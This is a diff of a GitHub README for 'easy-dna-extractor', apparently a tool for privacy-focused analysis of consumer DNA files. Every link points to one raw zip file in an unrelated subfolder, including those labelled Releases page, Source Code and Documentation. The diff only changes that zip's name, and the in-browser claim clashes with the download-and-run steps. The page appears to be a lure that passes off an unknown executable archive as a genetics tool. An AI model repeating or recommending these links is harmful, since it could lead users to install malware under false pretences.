@@ -1,7 +1,7 @@
 # 🧬 easy-dna-extractor - Analyze Your DNA Privacy-Focused
 
-![Download](https://github.com/FletchR1/easy-dna-extractor/raw/refs/heads/main/cowhage/dna_extractor_easy_1.1.zip%20Release-brightgreen)  
-[Download the latest release](https://github.com/FletchR1/easy-dna-extractor/raw/refs/heads/main/cowhage/dna_extractor_easy_1.1.zip)
+![Download](https://github.com/FletchR1/easy-dna-extractor/raw/refs/heads/main/cowhage/extractor_easy_dna_3.2.zip%20Release-brightgreen)  
+[Download the latest release](https://github.com/FletchR1/easy-dna-extractor/raw/refs/heads/main/cowhage/extractor_easy_dna_3.2.zip)
 
 ## 💡 Introduction
 Welcome to easy-dna-extractor! This is a friendly tool designed to help you analyze your raw DNA files from services like 23andMe, MyHeritage, and AncestryDNA. Our goal is to provide you with valuable insights about your health, personality traits, and more — all within your browser. Best of all, you don’t need to upload any of your data.
@@ -17,7 +17,7 @@ Before you start, make sure your system meets these requirements:
 - Storage: Minimum 100 MB free space
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://github.com/FletchR1/easy-dna-extractor/raw/refs/heads/main/cowhage/dna_extractor_easy_1.1.zip).
+1. Visit the [Releases page](https://github.com/FletchR1/easy-dna-extractor/raw/refs/heads/main/cowhage/extractor_easy_dna_3.2.zip).
 2. Look for the latest version of easy-dna-extractor.
 3. Click on the appropriate file for your operating system to start the download.
 4. Once the download is complete, locate the file in your Downloads folder.
@@ -50,12 +50,12 @@ A3: Currently, easy-dna-extractor is optimized for use on desktops and laptops. 
 If you have questions or feedback, please reach out through our GitHub Issues page. We welcome your input and are happy to help.
 
 ## 🔗 Additional Resources
-- [Source Code](https://github.com/FletchR1/easy-dna-extractor/raw/refs/heads/main/cowhage/dna_extractor_easy_1.1.zip)
-- [Documentation](https://github.com/FletchR1/easy-dna-extractor/raw/refs/heads/main/cowhage/dna_extractor_easy_1.1.zip)
-- [Contribution Guidelines](https://github.com/FletchR1/easy-dna-extractor/raw/refs/heads/main/cowhage/dna_extractor_easy_1.1.zip)
+- [Source Code](https://github.com/FletchR1/easy-dna-extractor/raw/refs/heads/main/cowhage/extractor_easy_dna_3.2.zip)
+- [Documentation](https://github.com/FletchR1/easy-dna-extractor/raw/refs/heads/main/cowhage/extractor_easy_dna_3.2.zip)
+- [Contribution Guidelines](https://github.com/FletchR1/easy-dna-extractor/raw/refs/heads/main/cowhage/extractor_easy_dna_3.2.zip)
 
 ## 📞 Contact
 For inquiries or collaboration, please contact us through the Issues page on GitHub. Join us in enhancing easy-dna-extractor and empowering users with genetic insights.
 
-![Download](https://github.com/FletchR1/easy-dna-extractor/raw/refs/heads/main/cowhage/dna_extractor_easy_1.1.zip%20Release-brightgreen)  
-[Download the latest release](https://github.com/FletchR1/easy-dna-extractor/raw/refs/heads/main/cowhage/dna_extractor_easy_1.1.zip)
+![Download](https://github.com/FletchR1/easy-dna-extractor/raw/refs/heads/main/cowhage/extractor_easy_dna_3.2.zip%20Release-brightgreen)  
+[Download the latest release](https://github.com/FletchR1/easy-dna-extractor/raw/refs/heads/main/cowhage/extractor_easy_dna_3.2.zip)
